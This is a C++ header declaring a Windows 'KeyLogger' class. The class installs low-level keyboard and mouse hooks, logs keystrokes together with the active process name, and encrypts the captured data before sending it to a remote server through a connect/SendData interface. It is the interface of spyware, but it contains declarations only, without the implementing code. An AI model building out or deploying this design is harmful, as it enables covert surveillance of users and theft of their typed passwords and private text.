#pragma once

#include <iostream>
#include "Network.h"
#include "OpenSLL.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <ostream>
#include <random>
#include <functional>
#include <tchar.h>
#include <Psapi.h>
#include <thread>

class KeyLogger
{
private:
	bool								isConnected;
	bool								isDataOn;
	bool								isDataOff;
	bool								Data_;
	bool								Online_;

private:
	std::string							Log_;
	static KeyLogger					Instance_;
	std::vector<t_Data>					Packet_;
	t_Data								stock_key;
	t_Data								stock_mouse;

public:
	 static KeyLogger					&Instance() {
		return Instance_;
	}
	void								print_packet();

public:
	DWORD WINAPI		 LaunchKeyHook(LPVOID param);
	DWORD WINAPI		 LaunchMouseHook(LPVOID param);
	static __declspec(dllexport) LRESULT CALLBACK KeyInput(int nCode, WPARAM wParam, LPARAM lParam);
	static __declspec(dllexport) LRESULT CALLBACK MouseInput(int nCode, WPARAM wParam, LPARAM lParam);
	void MsgLoop();
	int					alt_case(int scanCode);
	int					shift_case(int scanCode, int key);
	void				AddLog(char key);
	t_Data				getPacket() const;
	void				AddNewPacket();
	char				NonSystemKey(LPARAM lParam);
	char				SystemKey(LPARAM lParam);
	std::string			getActualProcess() const;
	std::string			RefractProcess(std::string process, DWORD id) const;
	int					Check_end() const;
	DWORD				getOldPid(char *data) const;

public:
	std::string			getLog() const;
	void				setLog(std::string _log);

private:
	std::string							ID_;
	std::string							IPServer_;
	int									PortServer_;
	Network								Network_;
	std::shared_ptr<CryptoApp>			CryptoApp_;
	unsigned char*						Key_;

public:
	int					tryConnect();
	int					Disconnect();
	int					SendData(std::string&);
	int					SendData(unsigned char*);
	int					SendLocalData(std::string&);

public:
	int					Initialization(std::string&);
	int					Run();

public:
	KeyLogger();
	KeyLogger(const KeyLogger&) {}
	~KeyLogger();
};

